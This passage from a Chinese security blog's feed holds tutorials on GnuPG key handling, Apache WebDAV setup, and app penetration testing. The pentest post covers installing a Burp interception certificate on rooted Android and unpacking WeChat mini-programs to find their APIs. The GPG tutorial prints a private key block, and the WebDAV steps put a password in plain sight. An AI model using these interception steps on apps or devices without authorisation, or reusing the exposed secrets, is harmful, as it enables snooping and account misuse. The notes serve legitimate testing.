&lt;crkmyth1cal@protonmail.com&gt;sub   cv25519 2021-06-19 [E] [expires: 2023-06-19]</code></pre><p><a id="org1f0eac3"></a></p><h2 id="更改密钥密码"><a href="#更改密钥密码" class="headerlink" title="更改密钥密码"></a>更改密钥密码</h2><pre><code>gpg --change-passphrase crkmyth1calgpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.</code></pre><p><a id="org727b018"></a></p><h2 id="列出公-私钥"><a href="#列出公-私钥" class="headerlink" title="列出公/私钥"></a>列出公/私钥</h2><pre><code>gpg --list-keys  # or -k/Users/crkmyth1cal/.gnupg/pubring.kbx-------------------------------------pub   ed25519 2021-06-19 [SC] [expires: 2023-06-19]      CDD514503006241E57352861AA72032823A2ECCAuid           [ultimate] crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;sub   cv25519 2021-06-19 [E] [expires: 2023-06-19]gpg --list-secret-key # or -K/Users/crkmyth1cal/.gnupg/pubring.kbx-------------------------------------sec   ed25519 2021-06-19 [SC] [expires: 2023-06-19]      CDD514503006241E57352861AA72032823A2ECCAuid           [ultimate] crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;ssb   cv25519 2021-06-19 [E] [expires: 2023-06-19]</code></pre><p><a id="org3966672"></a></p><h2 id="导出公-私钥"><a href="#导出公-私钥" class="headerlink" title="导出公/私钥"></a>导出公/私钥</h2><pre><code>gpg -a -o crkmyth1cal.gpg  --export crkmyth1cal@protonmail.com-----BEGIN PGP PUBLIC KEY BLOCK-----mDMEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7nLfqz4MO0KGNya215dGgxY2FsIDxjcmtteXRoMWNhbEBwcm90b25tYWlsLmNvbT6ImgQTFgoAQhYhBM3VFFAwBiQeVzUoYapyAygjouzKBQJgzWm1AhsDBQkDwmcABQsJCAcCAyICAQYVCgkICwIEFgIDAQIeBwIXgAAKCRCqcgMoI6LsynziAQCa+VwORih0H2Ycnx8vaM4hwr1iyySb3Bb5o0caHdeu3QEAzBAaIX6JnVPJnIskca6b+k+iJJsWB0xG/GTwp/G5Egi4OARgzWm1EgorBgEEAZdVAQUBAQdAmrrwVy7J5GgqpA9PfB63oTVQAKR/w6aARrqQ7VNybWYDAQgHiH4EGBYKACYWIQTN1RRQMAYkHlc1KGGqcgMoI6LsygUCYM1ptQIbDAUJA8JnAAAKCRCqcgMoI6LsyiSuAQD2PfSX8REDV34euf9DRoBg0uKhLTgQtgm2zeEcpm+0UAD/V4KzFUFrwMqHComhztuWLEWiCZdvRn1n+n4vvYFYggQ==3qda-----END PGP PUBLIC KEY BLOCK-----gpg -ao crkmyth1cal@protonmail.com.private.key  --export-secret-keys crkmyth1cal@protonmail.com-----BEGIN PGP PRIVATE KEY BLOCK-----lIYEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7nLfqz4MP+BwMClpMTsR0QrB7z+mUYYoXKHAVO6Sx8Qou3jDkh+13GjO8T0BKtvJxp4gg+ycTou2JKSF79LJPTVJKMxO+qVL9ZoXNKPMroumiraVtFKp2OOrQoY3JrbXl0aDFjYWwgPGNya215dGgxY2FsQHByb3Rvbm1haWwuY29tPoiaBBMWCgBCFiEEzdUUUDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwMFCQPCZwAFCwkIBwIDIgIBBhUKCQgLAgQWAgMBAh4HAheAAAoJEKpyAygjouzKfOIBAJr5XA5GKHQfZhyfHy9oziHCvWLLJJvcFvmjRxod167dAQDMEBohfomdU8mciyRxrpv6T6IkmxYHTEb8ZPCn8bkSCJyLBGDNabUSCisGAQQBl1UBBQEBB0CauvBXLsnkaCqkD098HrehNVAApH/DpoBGupDtU3JtZgMBCAf+BwMC3RGXbNzVlWDz4USVVz26VGm7Wo8VSovee7SFJ2YXwFbx0//u5luXDYhKK7iTrtjDQqMXk1LOnOdO1HM5nn0uD5N5eTgRKfiDBLZRYRXxaIh+BBgWCgAmFiEEzdUUUDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwwFCQPCZwAACgkQqnIDKCOi7MokrgEA9j30l/ERA1d+Hrn/Q0aAYNLioS04ELYJts3hHKZvtFAA/1eCsxVBa8DKhwqJoc7blixFogmXb0Z9Z/p+L72BWIIE=hdmV-----END PGP PRIVATE KEY BLOCK-----</code></pre><p><a id="org81de83f"></a></p><h2 id="导入公-私钥"><a href="#导入公-私钥" class="headerlink" title="导入公/私钥"></a>导入公/私钥</h2><pre><code>gpg --import crkmyth1cal.gpggpg --import crkmyth1cal.private.keygpg: key AA72032823A2ECCA: &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; not changedgpg: key AA72032823A2ECCA: secret key importedgpg: Total number processed: 1gpg:              unchanged: 1gpg:       secret keys read: 1gpg:  secret keys unchanged: 1</code></pre><p><a id="org76bf1ce"></a></p><h2 id="验证公钥"><a href="#验证公钥" class="headerlink" title="验证公钥"></a>验证公钥</h2><pre><code>gpg --edit-key crkmyth1calgpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Secret key is available.sec  ed25519/AA72032823A2ECCA     created: 2021-06-19  expires: 2023-06-19  usage: SC     trust: ultimate      validity: ultimatessb  cv25519/603F4ACEF55D04B2     created: 2021-06-19  expires: 2023-06-19  usage: E[ultimate] (1). crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;gpg&gt; fpr  # fingerprintpub   ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt; Primary key fingerprint: CDD5 1450 3006 241E 5735  2861 AA72 0328 23A2 ECCAgpg&gt; sign&quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; was already signed by key AA72032823A2ECCANothing to sign with key AA72032823A2ECCAgpg&gt; quit</code></pre><p><a id="orgd8946c4"></a></p><h2 id="删除公钥-私钥"><a href="#删除公钥-私钥" class="headerlink" title="删除公钥/私钥"></a>删除公钥/私钥</h2><pre><code>gpg --delete-key crkmyth1cal@protonmail.comgpg --delete-secret-key crkmyth1cal@protonmail.com</code></pre><p><a id="orgaa85092"></a></p><h2 id="废除密钥"><a href="#废除密钥" class="headerlink" title="废除密钥"></a>废除密钥</h2><pre><code>gpg  --output revoke.asc  --gen-revoke crkmyth1cal@protonmail.com                                                                130 ↵sec  ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;Create a revocation certificate for this key? (y/N) yPlease select the reason for the revocation:  0 = No reason specified  1 = Key has been compromised  2 = Key is superseded  3 = Key is no longer used  Q = Cancel(Probably you want to select 1 here)Your decision? 3Enter an optional description; end it with an empty line:&gt; I&#39;m not used this key&gt;Reason for revocation: Key is no longer usedI&#39;m not used this keyIs this okay? (y/N) yASCII armored output forced.Revocation certificate created.Please move it to a medium which you can hide away; if Mallory getsaccess to this certificate he can use it to make your key unusable.It is smart to print this certificate and store it away, just in caseyour media become unreadable.  But have some caution:  The print system ofyour machine might store the data and make it available to others!gpg --import revoke.ascgpg --send-keys  crkmyth1cal@protonmail.com</code></pre><p><a id="org46449e8"></a></p><h2 id="exchange-on-keyservers"><a href="#exchange-on-keyservers" class="headerlink" title="exchange on keyservers"></a>exchange on keyservers</h2><pre><code>gpg --refresh-keys  # update all keys from a keyservergpg: refreshing 1 key from hkps://hkps.pool.sks-keyservers.netgpg: key 32B25331509A6D85: &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; not changedgpg: Total number processed: 1gpg:              unchanged: 1# 发送key ID到keyservergpg --send-keys 9001430FA52D253633CB1B8D32B25331509A6D85                                                                           2 ↵gpg: sending key 32B25331509A6D85 to hkps://hkps.pool.sks-keyservers.netgpg --search-keys ethan hunter  # search key and importgpg: data source: https://hkps.pool.sks-keyservers.net:443(1)    Ethan Hunter &lt;Ethanhunter@cock.li&gt;      2048 bit RSA key E6F7CD04BD975343, created: 2018-05-12, expires: 2020-05-12 (expired)Keys 1-1 of 1 for &quot;ethan hunter&quot;.  Enter number(s), N)ext, or Q)uit &gt; 1gpg: key E6F7CD04BD975343: public key &quot;Ethan Hunter &lt;Ethanhunter@cock.li&gt;&quot; importedgpg: Total number processed: 1gpg:               imported: 1# import keys from a keyservergpg --receive-keys B9c0165fgpg: key C7BA956CB9C0165F: public key &quot;ethan &lt;askding@bugbank.cn&gt;&quot; importedgpg: Total number processed: 1gpg:               imported: 1</code></pre><p><a id="orgc92c582"></a></p><h1 id="应用-加解密文件"><a href="#应用-加解密文件" class="headerlink" title="应用-加解密文件"></a>应用-加解密文件</h1><p><a id="org0c7f3d4"></a></p><h2 id="公钥方式"><a href="#公钥方式" class="headerlink" title="公钥方式"></a>公钥方式</h2><pre><code># encryptgpg  -ao msg.txt.gpg  -r crkmyth1cal   -e msg.txt  # -r = --recipient ,many recipient use : -r askDing -r crkmyth1cal -----BEGIN PGP MESSAGE-----hF4DYD9KzvVdBLISAQdAsW4ri+FuwxVn0pE1/WGl0hsmKL+j5+hWiXRohZFeXGgw9PDAlAPE5icl3aKaOH2ZLVPaGLerGjRVZDopJqmAH812IPvlZHtZdRSPvBhb39dr1GkBCQIV1TBYqTyxBsdFBrkOmc9dVS2/720cTcwoEISGa6RRAvzj1wIFDaP9yW0giA9TybkoHWaM0Gfa2Zb9d3I2FGfV+wnusWr1zl8HUGxQ+HwxaJi0PvRM1T1LZHla+qOU2zzdLNNlXP0==E0w0-----END PGP MESSAGE-----# decryptgpg -o msg.txt -d msg.txt.gpggpg: encrypted with cv25519 key, ID 603F4ACEF55D04B2, created 2021-06-19      &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot;</code></pre><p><a id="org55024ed"></a></p><h2 id="对称密码方法"><a href="#对称密码方法" class="headerlink" title="对称密码方法"></a>对称密码方法</h2><pre><code>#encryptgpg -ao msg.txt.symmetric.gpg  -c msg.txt  # -c as --symmetric-----BEGIN PGP MESSAGE-----jA0ECQMCDFhZquLMGzHz0loBJfOjQIg8gbP4LwMYHQ1dJzPmEjwPRR9WcT0OffXqXqjk0ku3bUCXhKcx4FTmapleTSDJUBqHRNmBf94F2cbnSt+JUJZNpyPkY447wDneSYkxccKlP67k+Ro==6Q3U-----END PGP MESSAGE-----# decryptgpg -o msg.txt  -d msg.txt.symmetric.gpggpg: AES256.CFB encrypted datagpg: encrypted with 1 passphrase</code></pre><p><a id="org101dfb7"></a></p><h1 id="应用-数字签名"><a href="#应用-数字签名" class="headerlink" title="应用-数字签名"></a>应用-数字签名</h1><p><a id="org02dfb61"></a></p><h2 id="私钥创建-公钥验证"><a href="#私钥创建-公钥验证" class="headerlink" title="私钥创建,公钥验证"></a>私钥创建,公钥验证</h2><pre><code># signgpg -ao msg.txt.sign -s msg.txt  # -s as --sign-----BEGIN PGP MESSAGE-----owGbwMvMwCVmtCnYMGBWbivjGp0k9tzidL2SipKEs02PSjIyixWAKFEhObE4VSE/TSE1L7mosqBEIS0zJ5Wro5SFQYyLQVZMkWUCozP/Ul1VM+PT0r0w01iZQGYwcHEKwEQWf2Vk2J26+Yxx+Y4vEWt5l2w8+HDx97CNWmeVDZfnrN7XlPemvp+R4YTTtZ2HxGVayz76q6yb1eRmfiuWbW/wHB3fzS0niydJsQIA=GoIj-----END PGP MESSAGE-----# verify gpg --verify msg.txt.signgpg: Signature made Sat Jun 19 13:38:42 2021 CSTgpg:                using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85gpg: Good signature from &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; [ultimate]# verify and restoregpg -o msg.txt -d msg.txt.signgpg: Signature made Sat Jun 19 13:38:42 2021 CSTgpg:                using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85gpg: Good signature from &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; [ultimate]</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>在Linux使用apache2搭建webdav服务</title>
    <link href="https://askding.github.io/Tools/%E5%9C%A8Linux%E4%BD%BF%E7%94%A8apache2%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1.html"/>
    <id>https://askding.github.io/Tools/%E5%9C%A8Linux%E4%BD%BF%E7%94%A8apache2%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1.html</id>
    <published>2022-04-05T02:56:25.000Z</published>
    <updated>2022-04-05T02:56:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="安装apache2并启用dav模块"><a href="#安装apache2并启用dav模块" class="headerlink" title="安装apache2并启用dav模块"></a>安装apache2并启用dav模块</h2><pre><code class="bash">sudo apt install -y apache2 sudo a2enmod dav dav_fs dav_lock auth_digest</code></pre><h2 id="创建webdav目录及DavLockDB文件"><a href="#创建webdav目录及DavLockDB文件" class="headerlink" title="创建webdav目录及DavLockDB文件"></a>创建webdav目录及DavLockDB文件</h2><pre><code class="bash">sudo mkdir /var/webdavsudo chown www-data:www-data /var/webdavsudo touch /var/DavLocksudo chown www-data:www-data /var/DavLock</code></pre><h2 id="创建访问用户"><a href="#创建访问用户" class="headerlink" title="创建访问用户"></a>创建访问用户</h2><pre><code class="bash">sudo htpasswd -Bc /var/passwd.dav admin m,./sudo chmod 640 /var/passwd.davsudo chown www-data:www-data /var/passwd.davsudo htpasswd -B /var/passwd.dav admin2 m,./     # 新增用户sudo htpasswd -D /var/passwd.dav admin2</code></pre><h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><pre><code class="bash">cat &lt;&lt;EOF &gt;/etc/apache2/site-available/webdav.conf&lt;VirtualHost *:80&gt;    ServerAdmin webmaster@dummy-host.example.com    ServerName dummy-host.example.com    ServerAlias www.dummy-host.example.com    DocumentRoot  /var/webdav    ErrorLog &quot;/private/var/log/apache2/dummy-host.example.com-error_log&quot;    CustomLog &quot;/private/var/log/apache2/dummy-host.example.com-access_log&quot; common    Alias /webdav /var/webdav    DavLockDB /var/DavLock    &lt;Directory /var/webdav/&gt;      Options Indexes MultiViews      AllowOverride None      Order allow,deny      allow from all    &lt;/Directory&gt;    &lt;Location /webdav&gt;      Dav On      AuthType Basic      AuthName &quot;webDav&quot;      AuthUserFile /var/webdav/passwd.dav      Require valid-user    &lt;/Location&gt;&lt;/VirtualHost&gt;EOFsudo apachectl configtest  #测试配置文件</code></pre><h2 id="重启服务并测试"><a href="#重启服务并测试" class="headerlink" title="重启服务并测试"></a>重启服务并测试</h2><pre><code class="bash">service apache2 restartcadaver http://127.0.0.1/webdav</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;安装apache2并启用dav模块&quot;&gt;&lt;a href=&quot;#安装apache2并启用dav模块&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>App渗透测试</title>
    <link href="https://askding.github.io/Evolution/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
    <id>https://askding.github.io/Evolution/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html</id>
    <published>2022-04-01T11:31:20.000Z</published>
    <updated>2022-04-01T11:31:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li> <a href="#org3a5ab9e">安装Burp证书系统级证书 (&gt;=Android 7.0，需Root)</a></li><li><a href="#org40251a1">微信小程序渗透测试流程</a><ol><li> <a href="#orge937791">获取微信小程序</a></li><li> <a href="#org55f77a6">下载反编译工具 wxappUnpacker 并反编译小程序</a></li><li> <a href="#orgec829aa">代码审计，找出所有API进行测试</a></li></ol></li></ol><p><a id="org3a5ab9e"></a></p><h1 id="安装Burp证书系统级证书-gt-Android-7-0，需Root"><a href="#安装Burp证书系统级证书-gt-Android-7-0，需Root" class="headerlink" title="安装Burp证书系统级证书 (&gt;=Android 7.0，需Root)"></a>安装Burp证书系统级证书 (&gt;=Android 7.0，需Root)</h1><p>因Android 7以后，系统不再信任用户级的证书，只能信任系统级的证书，所以需要将burp证书安装到Android系统目录下</p><ol><li><p>获取Burp证书</p><ul><li><p>方法一:<br>  Burp开启代理后，浏览器访问<a href="http://burp/">http://burp</a> 证书 cacert.der</p></li><li><p>方法二:</p><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210524192845burp_ca.png" alt="img"></p></li></ul></li><li><p>证书转换</p><pre><code> openssl x509 -inform DER -in cacert.der -out cacert.pem  # 证书格式转换 der --&gt; pem openssl version    # 查看openssl版本 openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1    # 打印证书hash值 9a5ba575  openssl版本在1.0以上执行 openssl x509 -inform PEM -subject_hash -in cacert.pem    | head -1    # 打印证书hash值  openssl版本在1.0以下执行 mv cacert.pem &lt;hash&gt;.0         # 将pem格式的证书重命名为  hash值.0</code></pre></li><li><p>将证书 <code>9a5ba575.0</code> 移动到系统证书目录 <code>/system/etc/security/cacerts</code></p><pre><code> adb push 9a5ba575.0  /sdcard/    # 推送到sdcard目录上 adb shell su mv /sdcard/9a5ba575.0  /system/etc/security/cacerts/    # 将证书移到此目录 chmod 644 /system/etc/security/cacerts/9a5ba575.0       # 设置权限 adb reboot                       # 重启生效</code></pre></li></ol><p><a id="org40251a1"></a></p><h1 id="微信小程序渗透测试流程"><a href="#微信小程序渗透测试流程" class="headerlink" title="微信小程序渗透测试流程"></a>微信小程序渗透测试流程</h1><p><a id="orge937791"></a></p><h2 id="获取微信小程序"><a href="#获取微信小程序" class="headerlink" title="获取微信小程序"></a>获取微信小程序</h2><p>Android 手机最近使用过的微信小程序所对应的 <code>wxapkg</code> 包文件都存储在特定文件夹下<br>~ /data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg/~<br><strong>{User}</strong> 为当前用户的用户名 <code>315e07770f778822*********2bfee</code></p><pre><code>adb shellsurm /data/data/com.tencent.mm/MicroMsg/&#123;User&#125;    # 先删除此目录,手机上点开待测的小程序后会重新生成此目录 原因：防止包含其他小程序cp -R /data/data/com.tencent.mm/MicroMsg/&#123;User&#125;/appbrand/pkg  /sdcard   # 将小程序目录复制到/sdcard上adb pull /sdcard/pkg  ./        # 将小程序拷贝到本地当前目录</code></pre><p><a id="org55f77a6"></a></p><h2 id="下载反编译工具-wxappUnpacker-并反编译小程序"><a href="#下载反编译工具-wxappUnpacker-并反编译小程序" class="headerlink" title="下载反编译工具 wxappUnpacker 并反编译小程序"></a>下载反编译工具 <a href="https://github.com/askDing/wxappUnpacker">wxappUnpacker</a> 并反编译小程序</h2><ol><li><p>下载反编译工具</p><pre><code> git clone git@github.com:askDing/wxappUnpacker.git cd wxappUnpacker ./install.sh -npm  # 安装npm和node ./install.sh       # 安装依赖</code></pre><ol><li><p>解包操作</p><pre><code> ./de_miniapp.sh -d  path/to/xxx.wxapkg      # 解某个小程序 ./de_miniapp.sh  /path/to/pkg               # 解pkg目录下所有的小程序</code></pre><p> <a href="https://www.wj0511.com/site/detail.html?id=357">微信小程序项目目录结构介绍</a></p><pre><code> ├── app.js              注册小程序，绑定生命周期回调函数、错误监听和页面不存在监听函数等 ├── app.json            小程序全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多tab等 ├── app.wxss            小程序公共样式表 ├── pages               存放小程序各个页面信息 │   │── index            │   │   ├── index.wxml  必须 页面构造类似html文件 │   │   ├── index.js    必须 对页面进行注册，指定页面的初始数据、生命周期回调、事件处理函数等 │   │   ├── index.json  页面窗口配置 │   │   └── index.wxss  页面样式表相当css文件 │   └── logs │       ├── logs.wxml │       └── logs.js └── utils               放置一些公用的方法 │        └── sitemap.json        配置小程序及其页面是否允许被微信索引 │        └── project.config.json 小程序项目配置文件 ------------------------------------------------------- ├─cloud-functions     ---云函数 │  └─setCrypto      ---数据加密模块，用户加密一些数据 │          index.js │          package.json │          ... │          ... │           ├─components      ---小程序自定义组件 │  ├─plugins      --- （重点）可独立运行的大型模块，可以打包成plugins │  │  ├─comment         ---评论模块 │  │  │  │  index.js │  │  │  │  index.json │  │  │  │  index.wxml │  │  │  │  index.wxss │  │  │  │  services.js    ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │  │  │  │       │  │  │  └─submit    ---评论模块子模块：提交评论 │  │  │          index.js │  │  │          index.json │  │  │          index.wxml │  │  │          index.wxss │  │  │       │  │  └─canvasPoster     ---canvas海报生成模块 │  │          index.js │  │          index.json │  │          index.wxml │  │          index.wxss │  │          services.js    ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │  │           │  └─templates   ---（重点）模板，通过外部传参的容器，不做过多的数据处理 │      │       │      ├─slideshow     ---滚屏切换模板 │      │      index.js │      │      index.json │      │      index.wxml │      │      index.wxss │      │      service.js    ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │      │       │      └─works       ---作品模板 │          │  index.js │          │  index.json │          │  index.wxml │          │  index.wxss │          │  service.js │          │   │          ├─articlePlugin    ---作品模板中的文章类型 │          │      index.js │          │      index.json │          │      index.wxml │          │      index.wxss │          │       │          ├─galleryPlugin    ---作品模板中的九宫格类型 │          │      index.js │          │      index.json │          │      index.wxml │          │      index.wxss</code></pre></li></ol></li></ol><p><a id="orgec829aa"></a></p><h2 id="代码审计，找出所有API进行测试"><a href="#代码审计，找出所有API进行测试" class="headerlink" title="代码审计，找出所有API进行测试"></a>代码审计，找出所有API进行测试</h2><ol><li><p>查看 <code>xxx.json</code> 文件匹配URI(html页面）</p><pre><code> &#123;     &quot;subPackages&quot;: [         &#123;             &quot;root&quot;: &quot;pages/pageNews/&quot;,             &quot;pages&quot;: [                 &quot;pages/pageNews/news/notice/index&quot;,                 &quot;pages/pageNews/news/details&quot;,             ]         &#125;,         &#123;             &quot;root&quot;: &quot;pages/pageRetail/&quot;,             &quot;pages&quot;: [                 &quot;pages/pageRetail/companys/company/company&quot;,                 &quot;pages/pageRetail/companys/companyAdd/companyAdd&quot;,                 &quot;pages/pageRetail/lsms/fghxq&quot;             ]         &#125;,   ] &#125;</code></pre></li><li><p>查看 <code>xxx.js</code> 文件，搜索 <code>module.exports</code>,找出域名和API接口,进行测试</p><pre><code> (function (module, exports, __webpack_require__) &#123;      &quot;use strict&quot;;      var httpUrl = &#123;          //本地环境          //baseUrl:&#39;http://127.0.0.1:8001/app_name/&#39;,          //baseysts:&#39;http://127.0.0.1:8004/&#39;          //开发环境          //baseUrl:&#39;http://192.168.1.199:8001/app_name/&#39;,          //baseysts:&#39;http://192.168.1.199:8004/&#39;          //安评环境          //baseUrl:&#39;http://10.150.86.125:8001/app_name/&#39;,          //baseysts:&#39;http://10.150.86.125:8004/&#39;          //正式环境          baseUrl: &#39;https://xx.xx.xx.xx/app_name/&#39;      &#125;;      module.exports = httpUrl;      /***/  &#125;) (function (module, exports, __webpack_require__) &#123;      &quot;use strict&quot;;      //const base = &quot;http://192.168.1.199:7120/&quot;      var bases = __webpack_require__(/*! ./https */ &quot;./src/config/https.js&quot;);      var base = bases.baseUrl;      var baseyst = bases.baseysts;      module.exports = &#123;          newsLists: base + &#39;appnews/news/list&#39;, //资讯列表          newsDetails: base + &#39;appnews/news/detail&#39;,          tbsbqr: base + &#39;appsbs/refund/tbsbqr&#39;,           queren: base + &#39;appsbs/refund/queren&#39;,           ....          gang_dong_geo: base + &#39;appbase/static/js/gang_dong_geo.json&#39; //地图json      &#125;;  &#125;)</code></pre></li></ol><p>References:</p><ul><li>  <a href="https://developers.weixin.qq.com/miniprogram/dev/framework/quickstart/">小程序开发官方文档</a></li><li>  <a href="http://www.hcoder.net/books/read/info/1181.html">微信小程序开发指南</a></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>如何在AWS上部署kali</title>
    <link href="https://askding.github.io/Tools/%E5%A6%82%E4%BD%95%E5%9C%A8AWS%E4%B8%8A%E9%83%A8%E7%BD%B2kali.html"/>
    <id>https://askding.github.io/Tools/%E5%A6%82%E4%BD%95%E5%9C%A8AWS%E4%B8%8A%E9%83%A8%E7%BD%B2kali.html</id>
    <published>2022-03-23T11:26:48.000Z</published>
    <updated>2022-03-23T11:26:48.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>利用msf框架对安卓手机进行简单操作</title>
    <link href="https://askding.github.io/Kali/Exploit/%E5%88%A9%E7%94%A8msf%E6%A1%86%E6%9E%B6%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C.html"/>
